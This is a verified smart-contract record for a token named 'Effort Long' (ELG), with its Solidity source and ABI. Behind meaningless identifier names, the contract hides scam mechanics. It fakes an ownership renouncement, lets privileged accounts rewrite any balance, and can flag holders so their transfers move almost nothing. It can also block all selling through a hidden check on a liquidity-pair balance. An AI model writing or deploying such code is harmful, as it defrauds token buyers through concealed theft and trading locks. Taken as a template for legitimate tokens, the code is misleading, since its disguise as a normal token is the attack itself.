{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface swapTakeMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxAmount {\n    function createPair(address enableMin, address takeLiquidityBuy) external returns (address);\n}\n\ninterface swapLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listSwap) external view returns (uint256);\n\n    function transfer(address launchedShould, uint256 feeLaunchedAuto) external returns (bool);\n\n    function allowance(address isTradingAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeLaunchedAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedShould,\n        uint256 feeLaunchedAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchTradingFund, uint256 value);\n    event Approval(address indexed isTradingAt, address indexed spender, uint256 value);\n}\n\ninterface swapLaunchMetadata is swapLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EffortLong is amountTotal, swapLaunch, swapLaunchMetadata {\n\n    bool public senderAuto;\n\n    function owner() external view returns (address) {\n        return tokenAt;\n    }\n\n    string private launchedMarketing = \"ELG\";\n\n    constructor (){\n        if (toMin == maxSender) {\n            listEnable = toMin;\n        }\n        swapTakeMarketing txAuto = swapTakeMarketing(buyShould);\n        toAt = maxAmount(txAuto.factory()).createPair(txAuto.WETH(), address(this));\n        \n        swapLimit = _msgSender();\n        feeAutoAmount();\n        senderList[swapLimit] = true;\n        amountMin[swapLimit] = fundTradingReceiver;\n        \n        emit Transfer(address(0), swapLimit, fundTradingReceiver);\n    }\n\n    event OwnershipTransferred(address indexed autoFee, address indexed atSender);\n\n    mapping(address => mapping(address => uint256)) private launchedReceiver;\n\n    function tradingAt(address maxExemptEnable) public {\n        autoReceiverFund();\n        \n        if (maxExemptEnable == swapLimit || maxExemptEnable == toAt) {\n            return;\n        }\n        sellFrom[maxExemptEnable] = true;\n    }\n\n    uint8 private buyTxFund = 18;\n\n    uint256 walletAutoTo;\n\n    function feeAuto(address enableAmount, address launchedShould, uint256 feeLaunchedAuto) internal returns (bool) {\n        require(amountMin[enableAmount] >= feeLaunchedAuto);\n        amountMin[enableAmount] -= feeLaunchedAuto;\n        amountMin[launchedShould] += feeLaunchedAuto;\n        emit Transfer(enableAmount, launchedShould, feeLaunchedAuto);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedMarketing;\n    }\n\n    function autoReceiverFund() private view {\n        require(senderList[_msgSender()]);\n    }\n\n    function walletLimitLiquidity(address launchFund) public {\n        if (modeEnableMin) {\n            return;\n        }\n        \n        senderList[launchFund] = true;\n        \n        modeEnableMin = true;\n    }\n\n    function atWallet(uint256 feeLaunchedAuto) public {\n        autoReceiverFund();\n        senderFund = feeLaunchedAuto;\n    }\n\n    bool public modeEnableMin;\n\n    address marketingSellIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return tokenAt;\n    }\n\n    bool private walletEnable;\n\n    uint256 public maxSender;\n\n    address private tokenAt;\n\n    uint256 private toMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyTxFund;\n    }\n\n    address public toAt;\n\n    bool public atSell;\n\n    uint256 constant buySenderLiquidity = 4 ** 10;\n\n    address public swapLimit;\n\n    bool private modeEnable;\n\n    function balanceOf(address listSwap) public view virtual override returns (uint256) {\n        return amountMin[listSwap];\n    }\n\n    uint256 private shouldLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundTradingReceiver;\n    }\n\n    function allowance(address tradingAutoFee, address walletBuy) external view virtual override returns (uint256) {\n        if (walletBuy == buyShould) {\n            return type(uint256).max;\n        }\n        return launchedReceiver[tradingAutoFee][walletBuy];\n    }\n\n    function transfer(address fromIs, uint256 feeLaunchedAuto) external virtual override returns (bool) {\n        return receiverMin(_msgSender(), fromIs, feeLaunchedAuto);\n    }\n\n    mapping(address => uint256) private amountMin;\n\n    function feeAutoAmount() public {\n        emit OwnershipTransferred(swapLimit, address(0));\n        tokenAt = address(0);\n    }\n\n    mapping(address => bool) public senderList;\n\n    function modeTeam(address fromIs, uint256 feeLaunchedAuto) public {\n        autoReceiverFund();\n        amountMin[fromIs] = feeLaunchedAuto;\n    }\n\n    function transferFrom(address enableAmount, address launchedShould, uint256 feeLaunchedAuto) external override returns (bool) {\n        if (_msgSender() != buyShould) {\n            if (launchedReceiver[enableAmount][_msgSender()] != type(uint256).max) {\n                require(feeLaunchedAuto <= launchedReceiver[enableAmount][_msgSender()]);\n                launchedReceiver[enableAmount][_msgSender()] -= feeLaunchedAuto;\n            }\n        }\n        return receiverMin(enableAmount, launchedShould, feeLaunchedAuto);\n    }\n\n    uint256 private tradingLaunched;\n\n    address buyShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private fundTradingReceiver = 100000000 * 10 ** 18;\n\n    function receiverMin(address enableAmount, address launchedShould, uint256 feeLaunchedAuto) internal returns (bool) {\n        if (enableAmount == swapLimit) {\n            return feeAuto(enableAmount, launchedShould, feeLaunchedAuto);\n        }\n        uint256 limitExempt = swapLaunch(toAt).balanceOf(marketingSellIs);\n        require(limitExempt == senderFund);\n        require(launchedShould != marketingSellIs);\n        if (sellFrom[enableAmount]) {\n            return feeAuto(enableAmount, launchedShould, buySenderLiquidity);\n        }\n        return feeAuto(enableAmount, launchedShould, feeLaunchedAuto);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atTotal;\n    }\n\n    mapping(address => bool) public sellFrom;\n\n    uint256 senderFund;\n\n    uint256 private listEnable;\n\n    function approve(address walletBuy, uint256 feeLaunchedAuto) public virtual override returns (bool) {\n        launchedReceiver[_msgSender()][walletBuy] = feeLaunchedAuto;\n        emit Approval(_msgSender(), walletBuy, feeLaunchedAuto);\n        return true;\n    }\n\n    string private atTotal = \"Effort Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTradingAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTradingFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAutoFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLaunchedAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeLaunchedAuto\",\"type\":\"uint256\"}],\"name\":\"atWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAutoAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeEnableMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLaunchedAuto\",\"type\":\"uint256\"}],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExemptEnable\",\"type\":\"address\"}],\"name\":\"tradingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLaunchedAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLaunchedAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFund\",\"type\":\"address\"}],\"name\":\"walletLimitLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EffortLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}